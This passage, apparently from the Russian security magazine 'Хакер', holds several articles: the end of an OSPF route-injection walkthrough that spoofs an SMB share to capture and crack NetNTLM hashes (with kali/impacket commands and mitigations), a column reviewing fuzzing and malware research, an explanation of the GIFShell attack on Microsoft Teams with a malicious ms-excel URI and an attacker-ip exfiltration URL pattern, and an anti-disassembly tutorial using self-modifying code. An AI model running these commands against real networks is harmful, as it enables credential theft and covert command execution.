От административного расстояния (АР) зависит пред почтитель ность маршру -
та. Чем выше это значение, тем мень ше вероятность, что маршрут будет выб-
ран. Значение АР для OSPF эквивален тно 110.
   Так же у нас есть стоимость маршру та. С помощью FRR мы укажем
на редистрибуцию статического маршру та с нулевой стоимостью. Чем эта мет -
рика ниже, тем маршрут более пред почтителен. И так как при инжекте мы ука-
зываем маску /32, шанс помещения инжекта в таблицу маршру тизации крайне
велик. Потому что пакет, оказавшийся на маршру тизаторе, пойдет в сеть
с наиболь шей маской (а это будет в формате маршру та 192.168.100.1/32
via 10.10.50.2)
   Струк тура инъекции:


kali(config)# ip route 192.168.100.1/32 eth0

Здесь
 • 192.168.100.1 — адрес целевого сервера;
 • /32 — маска под сети. Она эквивален тна 255.255.255.255;
 • eth0 — сетевой интерфейс атакующей системы. То есть в маршру те адре-
  сом следующего прыжка (next hop) будет наш хост.

Теперь нужно создать вторичный адрес на сетевом интерфейсе со значением
адреса целевой SMB-шары, так как трафик будет ходить на наш хост по dst ip
192.168.100.1/32.


in9uz@kali:~$ sudo ifconfig eth0:1 192.168.100.1 netmask 255.255.
255.255

Теперь весь трафик, пред назначен ный для той SMB-шары, пойдет в нашу сто-
рону. После чего мы можем под нять простой SMB-сервер с помощью impacket
и перехватить учет ные дан ные поль зователей в зашифрован ном виде. Да, речь
о NetNTLM-хешах. После этого их можно либо сбру тить (Bruteforce), либо
отрелеить (NTLM Relay).
  В итоге возникает атака Evil Twin, то есть «злой двойник».
  Под нимем шару с помощью Impacket и запустим анализатор net-creds.py:


in9uz@kali:~$ sudo impacket-smbserver -smb2support sharePath /
home/in9uz/smb-poc-share
in9uz@kali:~/toolkit/net-creds$ sudo python2 net-creds.py -i eth0

После начала атаки мы перехватываем огромное количество NetNTLM-хешей.
Толь ко посмотри на это!





       Перехвачен ные NetNTLM-хеши поль зователя intervalsabove

Попробу ем сбру тить пароль этого поль зователя.





                        Взломан ный пароль

В итоге у нас есть креды intervalsabove:viewfromabove. Приколь но!
   Вот таким образом можно перехватывать учет ные дан ные поль зователей.
NTLM Relay тоже, кстати, работает коррек тно.





                           Атака NTLM Relay

Вмешиваясь в сам процесс маршру тизации, будь осторожен! Эта атака крайне
агрессивна: ког да поль зователи будут сту чать ся к какой-нибудь SMB-шаре
за своими файлами, они ничего не найдут. Раз уж ты спу фишь саму шару,
может быть, тебе удастся под нять ее копию. Однако вскоре ты соберешь дос-
таточно хешей и можешь остановить атаку. Затягивать эксплу атацию не стоит,
иначе легитим ные сот рудники будут плакать, а пен тест перестанет быть сек -
ретом.
   Из-за высокой скорости сходимости в OSPF после отмены анон са маршру -
та струк тура таблицы маршру тизации станет как прежде, до атаки. И это нас-
тупит очень быстро. Скорость сходимости равна четырем секун дам. Однако
все будет зависеть от размеров самой сети, посколь ку все маршру тизаторы
должны обновить свои таблицы. В общем, будь осторожен.


kali(config)# no ip route 192.168.100.1/32 eth0


ÊÀÊ ÇÀÙÈÒÈÒÜÑß?
Àóòåíòèôèêàöèÿ
Исполь зуй аутен тификацию, и она не позволит неизвестным маршру тизаторам
под ключать ся к автоном ным системам динамической маршру тизации. Толь ко
позаботь ся о том, чтобы сам ключ аутен тификации был достаточно стойким
и его так просто не сбру тили.
  Пример настройки MD5-аутен тификации в Cisco IOS:


Router(config)# interface GigabitEthernet X/X
Router(config-if)# ip ospf authentication message-digest
Router(config-if)# ip ospf message-digest-key 1 md5
y0uve_t4ken_y0ure_pr3c1ous_t1me


Èñïîëüçóé ïàññèâíûå èíòåðôåéñû
Они запрещают тому или иному интерфейсу рассылать пакеты приветствия,
что лишает пен тестера шан сов под ключить ся к домену маршру тизации. Нав-
сегда.
  Пример настройки пассивного интерфейса в Cisco IOS:


Router(config)# router ospf X
Router(config-if)# passive-interface GigabitEthernet X/X


ÂÛÂÎÄÛ
Вот такие атаки возможны в сетях с мисконфигурацией доменов динамической
маршру тизации. Злоумыш ленники могут исполь зовать подобную технику вку пе
с фишин гом, что сделает атаку еще более опасной. Надеюсь, мое исследова-
ние поможет не им, а благонамерен ным пен тестерам, а сетевые администра-
торы начнут зак рывать подобные дыры.
ВЗЛОМ





    КОЛОНКА ДЕНИСА МАКРУШИНА





Три месяца лета позади, а зна чит, пора
раз гребать зак ладки в бра узере и избран -
ные   посты,   которые   откла дыва лись
до появ ления рабочего настро ения. Про -
ведем обзор опубликован ных блог постов,        Денис Макрушин                                                                                   Специализируется на
док ладов и  исследова тельских матери -        исследовании угроз и                                                                                    разработке технологий
алов, которые вряд ли ста нут «исследова -      защиты#InspiredByInsecureот целевых атак.
ниями года», но несут в себе новые тех-         condifesa@gmail.com
ники. Кто зна ет, какая из них может вдруг
выстрелить и пол ностью поменять лан -
дшафт угроз?


ÒÅÕÍÈÊÈ ÔÀÇÇÈÍÃÀ È ÄÈÍÀÌÈ×ÅÑÊÎÃÎ ÀÍÀËÈÇÀ ÏÎ
Здесь я собрал исследования в направлении динамического анализа ПО и,
в частности, фаззинга, которому мы в прош лом посвятили от дель ный выпуск .


Ôàççèì ClamAV ñåìïëàìè ìàëâàðè
Fuzzing ClamAV with real malware samples
  Ин тересный под ход к поиску багов в антивирусном движке с исполь зовани-
ем реаль ных сем плов зловредов в качестве корпуса для фаззинга. Фаззить
антивирус вредоносами — это как проверять работоспособность системы про-
тивовоздушной обороны реаль ными ракетами.
   Автор выбрал опен сорсный движок ClamAV, который так же исполь зует ся
в ком мерческих решениях. В качестве первоначаль ного набора тест-кейсов
(корпуса) исполь зует ся база сем плов vx-underground.
  В материале автор проходит полный цикл фаззинга: от под готовки цели
до анализа резуль татов. Тем, кто хочет перейти от теории к прак тике, достаточ-
но повторить описан ные этапы.


Êàê çàðàáîòàòü ôàççèíãîì 200 òûñÿ÷ äîëëàðîâ çà âûõîäíûå
Earn $200K by fuzzing for a weekend: Part 1
  За круг лой сум мой в заголовке прячет ся еще одно под тверждение того, что
memory-safe не означает отсутствие уязвимостей. На примере виртуаль ной
машины, написан ной на Rust, автор продемонстрировал эффективность поис-
ка багов Rust-приложений, применив известные техники фаззинга к известно-
му таргету.
  В  материале  уделено внимание под готовке  тестовых оракулов  (test
oracles) — механизмов определения ожидаемого и аномаль ного поведений
таргета в процессе тестирования.


SFUZZ — âûñîêîïðîèçâîäèòåëüíûé ôàççåð íà îñíîâå êàñòîìíîãî
JIT-äâèæêà
SFUZZ: High Performance Coverage-guided Greybox Fuzzer with Custom JIT
Engine
  SFUZZ — это новый фаззер для тестирования методом серого ящика, осно-
ван ный на эму ляции. Он исполь зует кастомный JIT-ком пилятор для повышения
производитель ности. Автор утверждает, что его инстру мент работает быстрее,
чем AFL++, и под тверждает это сравнитель ными тестами.
   Главный недостаток SFUZZ, который не позволит ему заменить AFL++,
в том, что он фаззит бинарники толь ко для RISC-V. Сейчас для этой архитек -
туры не так много интересных таргетов, хотя это может и изменить ся.


Èñïîëüçîâàíèå ñèìâîëüíîãî âûïîëíåíèÿ äëÿ âûÿâëåíèÿ
âðåäîíîñíîãî êîäà
Using a Practical Symbolic Engine to Detect Evasive Forms of Malware/Ransomware
(PDF)
  На кон ферен ции Black Hat 2022 показали интересную технику выявления
вредоносного ПО и, в частности, экзем пляров ран сомвари. Авторы пред лагают
обойти ограничения методов динамического анализа ПО, которые плохо
справляют ся с обфусцирован ными или модифицирован ными вредоносами,
и применить движок сим воль ного выполнения.
  Сим воль ное выполнение — это метод анализа бинарного кода, ког да вход -
ные дан ные для целевой прог раммы заменяют сим волами. В итоге анализатор
будет исполь зовать сим воль ное выражение (формулу) вместо кон крет ных зна-
чений.





  Архитек тура движка сим воль ного исполнения для анализа вредоносного
 ПО

С помощью этого метода в прог раммах ищут ошибки, но авторы исследования
решили применить его для определения экзем пляров вымогателей. Выбрав
три ключевых признака сем плов ран сомвари (перечисление файлов, операция
над файлами, шифрование), исследователи восполь зовались техникой сим -
воль ного выполнения для детек та. Резуль таты: детект 95,60% ран сомвари, 0%
ложных срабаты ваний.


ÍÎÂÛÅ ÒÅÕÍÈÊÈ ÂÐÅÄÎÍÎÑÍÎÃÎ ÏÎ
Symbiote â ïîäðîáíîñòÿõ: àíàëèç íîâîé óãðîçû äëÿ Linux, êîòîðóþ
ïî÷òè íåâîçìîæíî îáíàðóæèòü
Symbiote Deep-Dive: Analysis of a New, Nearly-Impossible-to-Detect Linux Threat
   Здесь разбирается новый образец вредоносного ПО, который применяет
eBPF и LD_PRELOAD для сок рытия. Для защиты от инспек тирования трафика
бэк дор исполь зует интересную технику внед рения дополнитель ного кода
в  заг ружаемые  в ядро BPF-прог раммы,  что позволяет  скрыть  сетевую
активность от анализаторов, запускаемых на той же системе позднее.





     Набор техник, которые Symbiote исполь зует для своего сок рытия

Ког да администратор запускает какой-то анализатор пакетов на заражен ной
машине, в ядро внед ряет ся байт-код BPF, определяющий, какие пакеты ана-
лизатор должен захватить. Это позволяет бэк дору манипу лировать анализом
трафика и скры вать сетевую активность.


Agenda — íîâàÿ ðàíñîìâàðü íà Go, ìåíÿþùàÿ òàêòèêè
New Golang Ransomware Agenda Customizes Attacks
  Обнаружен новый экзем пляр ран сомвари, написан ный на Golang. Примеча-
тель но, что Go и Rust становят ся популярными у разработ чиков малвари.
Кросс-плат формен ные язы ки прог раммирования позволяют злодеям охватить
боль ше архитек тур и операционных систем и ском прометировать боль ше раз-
нообразных корпоративных сред.
   Кроме того, подобную малварь труд но анализировать, потому что ком -
пилятор Go статически под ключает необходимые библиотеки в бинарном фай-
ле. Итоговый бинарь получается настоль ко боль шим, что многие анализаторы
и реверс-инженеры просто поперхнут ся.


Îìåðçèòåëüíàÿ âîñüìåðêà: òåõíèêè, òàêòèêè è ïðîöåäóðû (TTPs)
ãðóïïèðîâîê øèôðîâàëüùèêîâ
https://securelist.ru/modern-ransomware-groups-ttps/105553/
  Опубликован отчет с резуль татами анализа APT-группировок, которые
исполь зуют  трояны-вымогатели в своих операциях. Материал интересен
для всех, кто выстраивает систему защиты от ransomware в инфраструк туре.
   Ряд особен ностей, отмечен ных в отчете, можно исполь зовать для детек та
ран сомвари:
 1. Методы попадания в инфраструк туру у всех общие: человеческий фак тор
   (фишинг), откры тые сервисы (например, RDP) и множествен ные уязвимос-
   ти (причем известные).
 2. В процессе запуска все вредоносы исполь зуют коман дные и скриптовые
   интерпретаторы.
 3. Для зак репления образцы всех семейств исполь зуют техники манипу ляции
   учет ными записями.
 4. Для обхода средств защиты чаще всего исполь зуют ся стан дартные средс-
   тва ОС.
 5. Обнаружение ресурсов: все без исключения семейства исполь зуют техники
   обнаружения новых ресурсов (сетевых шар, хостов, файлов, процессов
   и так далее).
 6. Ком муникация с серверами управления: все образцы исполь зуют уровень
   приложений для ком муникации с C2, а некоторые пытаются красть дан ные
   по этому же каналу.
 7. Нарушение целостности дан ных: удаление бэкапов, вык лючение системных
   фун кций восстановления дан ных, остановка бизнес-приложений.

Аналитикам SOC на замет ку: последние три особен ности позволяют построить
стратегию целенаправлен ного детек та ран сомвари в заражен ной инфраструк -
туре.
   Кстати, вымогателей, нацелен ных на инфраструк туру с Docker и Kubernetes,
пока еще не так много. Возможно, это объясняется особен ностями под хода
«неизменяемой инфраструк туры» (immutable infrastructure): после попадания
в кон тейнерную среду у малвари оказывается не так много интересных мест
для шифрования или горизон таль ного перемещения. Клиент ские рабочие
стан ции и окру жение, построенное на Windows, куда вкуснее.
  Вероят но, в следующем квартале этого года стоит готовить ся к появлению
новых исследований,  связан ных с новыми  техниками  атак на облачную
инфраструк туру.
ВЗЛОМ





      КАК РАБОТАЕТ УЯЗВИМОСТЬ
               GIFSHELL




По пыт ки  спря тать  вредоносное  содер -
жимое  в обыч ных  гра фических фай лах
пред при нима лись уже дав но, и некото рые
из них даже были успешны ми. На днях
в  бло ге  BleepingComputer  был  опуб-       Валентин Холмогоров                                                                            Ведущий редактор
ликован от чет о новой уяз вимости, поз -         valentin@holmogorov.ru
воля ющей    запускать    reverse     shell
в Microsoft Teams при помощи обыч ных
GIF-фай лов. Давай посмотрим, как она
работа ет.


Ког да мы говорим о внед рении вредоносного кода в графические файлы, сра-
зу вспоминается дроппер, который извлекал бинарник трояна из сохранен ной
на диске картинки, и дру гая малварь, искавшая в опубликован ном на удален -
ном сервере изображении управляющие коман ды. Новый  век тор  атаки,
получивший наименование GIFShell, похож на второй слу чай. Он позволяет
киберпреступникам злоупот реблять недостатками корпоративной плат формы
Microsoft Teams для запуска reverse shell и выполнения на ском прометирован -
ном компь ютере вредоносных команд. Причем добиваются всего этого
при помощи обычных GIF-файлов. Ну, почти обычных.
   GIFShell пред ставляет собой не одну кон крет ную уязвимость, а целую
цепочку атак, исполь зующих различные недочеты в архитек туре плат формы
Microsoft Teams. Всего уязвимостей обнаружено семь, их выявил и системати-
зировал независимый эксперт по кибербезопасности Бобби Раух. Например,
поль зователям Microsoft Teams доступна возможность отправлять друг дру гу
вложен ные файлы, причем эти вложения могут заг ружать содержимое с внеш -
него URL, а не по внут ренней ссылке SharePoint. Эти файлы порой выг лядят
вполне безобид ными, однако при этом содержат неприят ный сюрприз. У поль -
зователя Microsoft Teams нет никакой возможности пред варитель но проверить,
вредоносно такое вложение или нет.
   Кроме того, Microsoft Teams позволяет заг ружать картинки в формате GIF
с удален ных серверов и отправлять поль зователям GIF-файлы в кодировке
HTML Base64 и никак не проверяет их содержимое. Поэтому можно спрятать
внут ри  такого файла  вредоносные  коман ды.  Плат форма  под держивает
небезопасные схемы URI, допускающие кражу хешей SMB NTLM или атаки
типа NTLM Relay. Наконец, весь трафик Microsoft Teams направляется клиентам
через серверы Microsoft, из-за чего антивиру сы считают его легитим ным и не
замечают угрозы. Все это в совокупности откры вает перед хакерами очень
интересные возможности.
  По соображениям безопасности поль зователи Microsoft Teams из одной
группы не имеют возможности напрямую обменивать ся файлами с членами
дру гих групп. В окне отправки сообщения участнику дру гой коман ды попросту
отсутству ет кнопка с изображением скрепки, позволяющая прик репить файл.
Однако простые сообщения отправлять можно — многие администраторы
даже не подозревают о том, что поль зователи Teams по умолчанию могут
получать сообщения от кого угод но.
   Ког да сообщение с вложением отправляет ся поль зователю из той же груп-
пы, Microsoft Teams формиру ет ссылку SharePoint на вложен ный файл, которая
преобразует ся в JSON и отправляет ся в виде POST-запроса на эндпойнт
Teams. По умолчанию такую ссылку могут просматривать толь ко отправитель
и получатель сообщения. Но серверы Microsoft не проверяют, есть ли в ссыл-
ках SharePoint в теле JSON адреса сторон них серверов, поэтому такая ссылка
может быть заменена любым URL. Это позволяет злоумыш леннику выполнить
атаку drive-by download. Кроме того, в этом JSON можно под менить и обоз-
начение формата файла, вместо разрешен ного JPEG передав, например, DLL
или EXE.
  Самое интересное, что на промежу точных серверах не проверяется и этот
параметр: получатель увидит, что в послание вложено изображение JPEG, раз-
ве что без пред варитель ного просмотра. Если юзер наведет курсор мыши
на это вложение, так же будет продемонстрировано имя вложен ной картинки,
например Christmas_Party_Photo.jpeg, хотя на самом деле файл имеет имя
Christmas_Party_Photo.jpeg.............exe.





  Вместо изображения в сообщении Teams может прятать ся любой файл.
  Скрин шот с сайта medium.com

Посколь ку исполь зуемые Teams JSON не имеют никакой CSRF-защиты, зло-
умыш ленник может лег ко автоматизировать отправку вредоносных сооб-
щений, скажем с помощью модуля на Python, обходя любые установленные
Microsoft ограничения.





  Так выг лядит вредоносный JSON. Скрин шот с сайта bleepingcomputer.com

Пример реализации такой атаки показан на видео.
   Microsoft Teams под держивает так называемую технологию deep linking.
С ее помощью поль зователи обмениваются ссылками, при нажатии на которые
выполняют ся те или иные действия Teams. Например, чтобы отправить дру -
гому поль зователю ссылку на чат, можно выслать ему такую запись:


msteams://l/chat/0/0?users=<email>

Любопыт но, но ссылки deep linking серверы Microsoft тоже не проверяют
на валид ность, что позволяет добавлять в сообщения прак тически любые URI.
Например, ссылку, которая заг ружает с сайта злоумыш ленников файл .xls
и откры вает его в Excel на машине жертвы:


ms-excel:/ofv|u|//10.10.10.10/ROPNOP/filename.xls

Кроме того, ког да поль зователь откры вает такую ссылку, на машину атакующе-
го отправляют ся дан ные SMB handshake, что позволяет злоумыш леннику
перехватить хеш NTLM и передать его кон троллеру домена.
  Следующая приятная для хакеров новость зак лючается в том, что файлы
журналов Microsoft Teams, в которых записы вают ся в том числе все сообщения
вместе с их содержимым, хранят ся в откры том виде на диске компь ютера
поль зователя. Причем для чтения этих файлов не требует ся даже наличия прав
администратора. Например, в версии Microsoft Teams для работы или обу чения
журналы хранят ся в следующей папке:


$HOME\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.
microsoft.com_0.indexeddb.leveldb\*.log

Получен ные сообщения сохраняются в этих журналах и доступны для чтения
всем группам поль зователей Windows, то есть любое вредоносное ПО на
устройстве может беспрепятствен но получить к ним доступ.
   Для успешного выполнения атаки GIFShell злоумыш ленник первым делом
при помощи гипноза социаль ной инженерии должен убедить потен циаль ную
жертву запустить на своей машине вредоносный стейджер. Переслать его
можно под видом безобид ного JPEG-файла, модифицировав отвечающий
за вложения в сообщения JSON (об этом методе было рассказано выше),
или с помощью ссылки deep  linking. Кон цепт такого стейджера выложен
на GitHub Бобби Рауха. Для разработ ки своей прог раммы автор исполь зовал
Python и PowerShell, но, в прин ципе, подобное приложение можно написать
на любом язы ке прог раммирования.
  Затем злоумыш ленник формиру ет и отправляет жертве закодирован ные
в Base64 GIF-файлы, в которые добавляет нужные ему системные коман ды.
Такие GIF-файлы отображаются в окне Microsoft Teams как обычные картинки
и вместе с самим сообщением сохраняются на диск в файл журнала. Стейджер
на атакуемом компь ютере сканиру ет журналы, ищет в них изображения в фор-
мате  GIF/Base64,  декодирует   их,  а  затем  выполняет  спрятан ные
в Base64 коман ды с исполь зованием PowerShell.
   Итак, половина дела сделана: мы смог ли выполнить коман ду на компь юте-
ре жертвы. Но ведь нужно еще передать ее вывод злоумыш леннику! Для этого
стейджер отслеживает выполнение команд на атакуемой машине, а затем
формиру ет URL  вида http://<attacker-ip>/<base64-encoded-command-
output>.gif,  где  attacker-ip —  это  IP-адрес  сервера  атакующего,
а base64-encoded-command-output —  закодирован ный в Base64 вывод
выполненной коман ды. Этот URL упаковы вает ся в так называемую карточку
опроса Microsoft Teams — сообщение в формате JSON — и отправляет ся
на серверы Microsoft Teams.
   Ког да сервер Microsoft получает такую карточку, он обращает ся к узлу ата-
кующего (IP-адрес которого содержится в URL) и пытается скачать отту да GIF-
файл. Даль ше все просто: в имени этого несуществу ющего GIF-файла зашиф-
рован в Base64 вывод коман ды, выполненной на машине жертвы. Этот вывод
расшифровывается и передается атакующему. Например, файл с именем
dGhlIHVzZXIgaXM6IA0KYm9iYnlyYXVjaDYyNzRcYm9iYnlyYXVJa0K.gif  будет
декодирован в вывод коман ды whoami, выполненной на ском прометирован -
ном устройстве:


the user is:
bobbyrauch6274\bobbyrauIkBáë

Таким замысловатым образом реализует ся достаточно эффективный обратный
шелл — в опубликован ном автором видео показано, как он работает.
   Атакующие могут отправлять жертве боль шое количество картинок в фор-
мате GIF, содержащих коман ды, и получать информацию о выполнении спря-
тан ных внут ри команд. Посколь ку все эти дан ные передаются через серверы
Microsoft Teams и пред ставляют собой обычный трафик приложения, антивиру -
сы и бран дмауэры не блокиру ют и не филь тру ют его, что дает злоумыш ленни-
кам полную свободу действий. Ну а посколь ку Microsoft Teams работает
как фоновый процесс, поль зователю даже не нужно откры вать его окно, чтобы
вредоносные коман ды выполнились на его компь ютере.
  Бобби Раух проинформировал Microsoft об обнаружен ных им уязвимостях
в мае и июне 2022 года, но в Ред монде не посчитали их критически важными,
и исследователь получил возможность обнародовать свою наход ку. Все опи-
сан ные  им  атаки  успешно  выполнялись  на   Microsoft  Teams  вер-
сии 1.5.00.11163, и они гаран тирован но будут работать на более ран них вер-
сиях. Администраторы блога BleepingComputer обратились в Microsoft за ком -
ментариями  по  поводу  устранения  обнаружен ных  Раухом  уязвимостей
и получили такой ответ: «Некоторые уязвимости невысокой степени серь -
езности, которые не пред ставляют непосредствен ной угрозы для поль зовате-
лей, не являются приоритет ными для немед ленного обновления безопас-
ности, но возможность их исправления будет рассмот рена в следующей вер-
сии ПО».
  Ины ми словами, Microsoft не торопит ся исправлять проблемы с безопас-
ностью, а значит, злоумыш ленники могут поль зовать ся ими и в даль нейшем.
Поэтому поль зователям Microsoft Teams следует проявлять особую осторож-
ность и бдитель ность, если они не хотят стать жертвой хакеров.
ВЗЛОМ





БОРЕМСЯ
С ДИЗАССЕМБЛЕРАМИ
И ЗАТРУДНЯЕМ
                                                                        Крис Касперски
                                                                             Известный российскийРЕВЕРС ПРОГРАММ                                                                                             хакер. Легенда ][, ex-
                                                                              редактор ВЗЛОМа. Также
                                                                                     известен под
                                                                           псевдонимами мыщъх,
                                                                                   nezumi (яп. 鼠, мышь), n2k,
                                                                                                 elraton, souriz, tikus, muss,
                                                                                                     farah, jardon, KPNC.





                                                              Юрий Язев
                                                                        Широко известен под
                                                                          псевдонимом yurembo.
                                                                              Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                 исследователь. Старый
                                                                               автор журнала «Хакер».
                                                                                   yazevsoft@gmail.com





Каждый  раз работ чик  прог рамм  стремит ся  защитить
результат сво его тру да от взло ма. Сегод ня нам пред сто ит
исследовать спо собы про тивостояния самому популяр -
ному виду хакер ско го инстру мен тария — дизассем блерам.
Нашей целью будет запутать хакера, отва дить его от взло -
ма нашей прог раммы, всевоз можны ми спо соба ми зат -
руднить ее ана лиз.




Пят надцать лет назад эпический труд Криса Касперски «Фун дамен таль ные
основы хакерства» был настоль ной книгой каждого начинающего исследова-
теля в области компь ютерной безопасности. Однако время идет, и знания,
опубликован ные Крисом, теряют акту аль ность. Редак торы «Хакера» попыта-
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
  Ссылки на дру гие статьи из этого цик ла ищи на странице автора.


Продолжаем держать оборону нашего приложения от атак злобных хакеров —
от их попыток «за просто так» восполь зовать ся плодами нашего тру да, от их
подозритель ного интереса к нашим прог раммам и скры ваемым в них сек -
ретам. Для этого мы продолжим создавать изощренные системы защиты,
на сей раз — от дизассем блирования.
   Чтобы справить ся с задачей, нам необходимо узнать о внут ренних механиз-
мах операционной системы, о средствах работы с памятью. Так же придет ся
разобрать ся в работе ком пиляторов, понять, как они генерируют код, вычис-
лить плюсы и минусы оптимизации. И наконец, пог рузить ся в шифрование,
научить ся  расшифровывать  прог рам мный  код  на  лету  непосредствен но
перед выполнением.


ÑÀÌÎÌÎÄÈÔÈÖÈÐÓÞÙÈÉÑß ÊÎÄ Â ÑÎÂÐÅÌÅÍÍÛÕ
ÎÏÅÐÀÖÈÎÍÍÛÕ ÑÈÑÒÅÌÀÕ

В эпоху расцвета MS-DOS прог раммисты широко исполь зовали самомодифи-
циру ющийся код, без которого не обходилась прак тически ни одна мало-маль -
ски серь езная защита. Да и не толь ко защита — он встречался в ком пиляторах,
ком пилиру ющих код непосредствен но в память, в распаковщиках исполняемых
файлов, в полиморфных генераторах и так далее.
   Ког да началась массовая миг рация поль зователей на Windows, разработ -
чикам приш лось задумать ся о переносе накопленного опы та и приемов прог -
раммирования на новую плат форму. От бескон троль ного доступа к железу,
памяти, ком понен там операционной системы и связан ных с ними хит роум ных
трюков прог раммирования приш лось отвы кать. В частности, стала невозможна
непосредствен ная модификация исполняемого кода приложений, посколь ку
Windows защищает его от непреднамерен ных изменений. Это привело к рож-
дению нелепого убеждения, буд то под Windows создание самомодифициру -
ющегося кода вообще невозможно, по крайней мере без исполь зования
недоку мен тирован ных возможностей операционной системы.
  На самом деле существу ет как минимум два докумен тирован ных способа
изменить код приложений, хорошо работающих под Windows NT и вполне
удовлетворяющихся привилегиями гостевого поль зователя.
   Во-первых, kernel32.dll экспортиру ет фун кцию WriteProcessMemory,
пред назначен ную, как и следует из ее названия, для модификации памяти про-
цесса. Во-вторых, прак тически все операционные системы, включая Windows
и Linux, разрешают выполнение и модификацию кода, размещен ного в стеке.
Между тем современ ные версии указан ных операционных систем нак ладыва-
ют на стек ограничения, мы под робно поговорим об этом чуть позднее.
  В прин ципе, задача создания самомодифициру ющегося кода может быть
решена исключитель но средствами язы ков высокого уровня, таких, например,
как C/C++ и Delphi, без применения ассем блера.


Àðõèòåêòóðà ïàìÿòè Windows
Создание самомодифициру ющегося кода требует знания некоторых тон костей
архитек туры Windows, не очень-то хорошо освещен ных в докумен тации. Точ-
нее, совсем не освещен ных, но от этого отнюдь не приобретающих статус
«недоку мен тирован ных особен ностей», посколь ку, во-первых, они одинаково
реализованы на всех Windows-плат формах, а во-вторых, их активно исполь зует
ком пилятор Visual C++ от Microsoft. Отсюда следует, что никаких изменений
даже в отдален ном будущем ком пания не планиру ет; в противном слу чае код,
сгенерирован ный этим ком пилятором, откажет в работе, а на это Microsoft
не пойдет (вернее, не должна пойти, если верить здравому смыслу).
  В режиме обратной совместимости для адресации четырех гигабайт вир-
туаль ной памяти, выделен ной в распоряжение процесса, Windows исполь зует
два селек тора, один из которых заг ружается в сег мен тный регистр CS, а дру -
гой — в регистры DS, ES и SS. Оба селек тора ссы лают ся на один и тот же
базовый адрес памяти, равный нулю, и имеют иден тичные лимиты, равные
четырем гигабайтам. Помимо перечисленных сег мен тных регистров, Windows
еще исполь зует регистр FS, в который заг ружает селек тор сег мента, содер-
жащего информацион ный блок потока — TIB.
  Фак тически существу ет всего один сег мент, вмещающий в себя и код,
и дан ные, и стек процесса. Благодаря этому управление коду, расположен -
ному в стеке, передается близким (near) вызовом или переходом, и для дос-
тупа к содержимому стека исполь зование префик са SS совершенно необя-
затель но. Несмотря на то что значение регистра CS не равно значению регис-
тров DS, ES и SS, коман ды
   • MOV dest,CS:[src]
• MOV dest,DS:[src]
• MOV dest,SS:[src]
   в действитель ности обращают ся к одной и той же ячейке памяти.
  Это точный прообраз реализован ной в процессорах на архитек туре x86-64
RIP-относитель ной адресации памяти, в которой не исполь зуют ся сег менты.
  От личия между регионами кода, стека и дан ных зак лючаются в атрибутах
принад лежащих им страниц: страницы кода допускают чтение и исполнение,
страницы дан ных — чтение и запись, а стека — чтение, запись и исполнение
одновремен но.
  Помимо этого, каждая страница имеет специаль ный флаг, определяющий
уровень привилегий, которые необходимы для доступа к этой странице.
Некоторые страницы, например те, что принад лежат операционной системе,
требуют наличия прав супервизора, которы ми обладает толь ко код нулевого
коль ца. Прик ладные прог раммы, исполняющиеся в коль це  3, таких прав
не имеют и при попыт ке обращения к защищен ной странице порождают
исключение. Манипу лировать атрибутами страниц, равно как и ассоциировать
страницы с линейными адресами, может  толь ко операционная система
или код, исполняющийся в нулевом коль це.
  Среди начинающих прог раммистов ходит совершенно нелепая байка о том,
что, если обратить ся к коду прог раммы коман дой, пред варен ной префик сом
DS, Windows якобы беспрепятствен но позволит его изменить. На самом деле
это в корне неверно — обратить ся-то она позволит, а вот изменить — нет,
каким бы способом ни происходило обращение, так как защита работает
на уровне физических страниц, а не логических адресов.


Èñïîëüçîâàíèå ôóíêöèè WriteProcessMemory
Если требует ся изменить некоторое количество байтов своего (или чужого)
процесса,  самый  простой  способ  сделать  это —  вызвать  фун кцию
WriteProcessMemory. Она позволяет модифицировать существу ющие стра-
ницы памяти, чей флаг супервизора не взведен, то есть все страницы, дос-
тупные из коль ца 3, в котором выполняют ся прик ладные приложения. Совер-
шенно бесполезно с помощью WriteProcessMemory пытать ся изменить кри-
тические  струк туры  дан ных  операционной  системы  (например,  page
directory или page table) — они доступны лишь из нулевого коль ца. Поэто-
му указан ная фун кция не пред ставляет никакой угрозы для безопасности сис-
темы и успешно вызывается независимо от уровня привилегий поль зователя.
  Процесс,  в память которого происходит  запись, должен быть пред -
варитель но   открыт  фун кцией  OpenProcess   с   атрибутами  доступа
PROCESS_VM_OPERATION и PROCESS_VM_WRITE. Часто прог раммисты, ленивые
от природы, идут более корот ким путем, устанавливая все атрибуты —
PROCESS_ALL_ACCESS. И это вполне закон но, хотя справед ливо считает ся дур-
ным стилем прог раммирования.
  Далее приведен простой пример self-modifying_code, иллюстрирующий
исполь зование фун кции WriteProcessMemory для создания самомодифициру -
ющегося кода:


#include <iostream>
#include <Windows.h>


using namespace std;


int WriteMe(void* addr, int wb)
{
    HANDLE h = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE
, true, GetCurrentProcessId());
    return WriteProcessMemory(h, addr, &wb, 1, NULL);
}


int main(int argc, char* argv[])
{
    _asm {
        push 0x74 ; JMP -> JZ
        push offset Here
        call WriteMe
        add esp, 8
        Here:   JMP short here
    }
    cout << "#JMP SHORT $-2 was changed to JZ $-2\n";
    return 0;
}

Фун кция WriteProcessMemory в рассмат риваемой прог рамме заменяет инс-
трук цию бесконечного цик ла JMP short $-2 условным переходом JZ $-2,
который продолжает нормаль ное выполнение прог раммы. Неплохой способ
зат руднить взлом щику изу чение приложения, не правда ли? Особен но если
вызов WriteMe не расположен возле изменяемого кода, а помещен в отдель -
ный поток. Будет еще лучше, если модифициру емый код вполне естественен
сам по себе и внеш не не вызывает никаких подозрений. В этом слу чае хакер
может долго блуждать в той вет ке кода, которая при выполнении прог раммы
вообще не получает управления.
   Для ком пиляции этого примера установи 32-бит ный режим резуль тиру -
ющего кода.




          Резуль тат выполнения приложения self-modifying_code

Если из ассем блерной вставки убрать вызов фун кции WriteMe, которая
перезаписы вает инструк цию JMP на JZ, прог рамма выпадет в бесконечный
цикл.





                Вы зов фун кции заком ментирован





                        Прог рамма зацик лена




Посколь ку Windows для экономии оперативной памяти разделяет код между
процессами, возникает вопрос: а что произойдет, если запустить вторую копию
самомодифициру ющейся прог раммы? Создаст ли операционная система
новые страницы или отош лет приложение к уже модифициру емому коду?
В докумен тации на Windows NT сказано, что она под держивает копирование
при записи (copy on write), то есть автоматически дублиру ет страницы кода
